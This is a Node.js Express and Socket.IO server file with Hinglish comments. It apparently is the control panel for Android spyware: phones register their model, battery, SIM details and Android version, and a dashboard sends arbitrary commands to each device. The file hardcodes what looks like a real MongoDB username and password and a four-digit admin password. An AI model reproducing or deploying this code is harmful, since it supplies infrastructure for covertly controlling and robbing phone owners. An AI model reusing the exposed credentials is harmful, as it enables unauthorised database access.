// server.js - Full Backend Code for Railway
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);

// Railway par connection tutne se bachane ke liye Ping settings
const io = socketIo(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000, 
    pingInterval: 25000 
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- DATABASE CONNECTION ---
// ⚠️ APNA PASSWORD 'XXXX' KI JAGAH LIKHEIN
const MONGO_URI = "mongodb+srv://ajaykumar3555g_db_user:Afsar786@cluster0.vvpfmnb.mongodb.net/bengal_tiger?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ MongoDB Connected"))
    .catch(err => console.log("❌ DB Error:", err));

const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, unique: true },
    model: String,
    battery: String,
    sim1: String, 
    sim2: String,
    androidVersion: String,
    isPinned: { type: Boolean, default: false },
    lastSeen: { type: Date, default: Date.now },
    isOnline: { type: Boolean, default: false },
    socketId: String
});
const Device = mongoose.model('Device', deviceSchema);

let adminPassword = "6296"; // Default Password

// --- API ROUTES ---
app.post('/api/login', (req, res) => {
    if (req.body.password === adminPassword) return res.json({ success: true });
    return res.json({ success: false });
});

app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body;
    if (oldPassword === adminPassword) {
        adminPassword = newPassword;
        return res.json({ success: true });
    }
    return res.json({ success: false });
});

app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find();
        res.json(devices);
    } catch (e) { res.status(500).json({error: "Error"}); }
});

app.post('/api/command', async (req, res) => {
    const { deviceId, action, data } = req.body;
    const device = await Device.findOne({ deviceId });
    
    if (device && device.socketId && device.isOnline) {
        io.to(device.socketId).emit('command', { action, data });
        res.json({ success: true, message: "Command Sent Successfully 🚀" });
    } else {
        res.json({ success: false, message: "Device Offline ❌" });
    }
});

app.post('/api/pin-device', async (req, res) => {
    await Device.findOneAndUpdate({ deviceId: req.body.deviceId }, { isPinned: req.body.status });
    io.emit('dashboard-update');
    res.json({ success: true });
});

app.post('/api/delete-device', async (req, res) => {
    await Device.findOneAndDelete({ deviceId: req.body.deviceId });
    io.emit('dashboard-update');
    res.json({ success: true });
});

// --- SOCKET LOGIC ---
io.on('connection', (socket) => {
    console.log('New Connection:', socket.id);

    socket.on('register_device', async (data) => {
        console.log("Device Connected:", data.model);
        await Device.findOneAndUpdate(
            { deviceId: data.deviceId },
            { ...data, socketId: socket.id, isOnline: true, lastSeen: new Date() },
            { upsert: true }
        );
        io.emit('dashboard-update');
    });

    socket.on('disconnect', async () => {
        await Device.findOneAndUpdate({ socketId: socket.id }, { isOnline: false });
        io.emit('dashboard-update');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));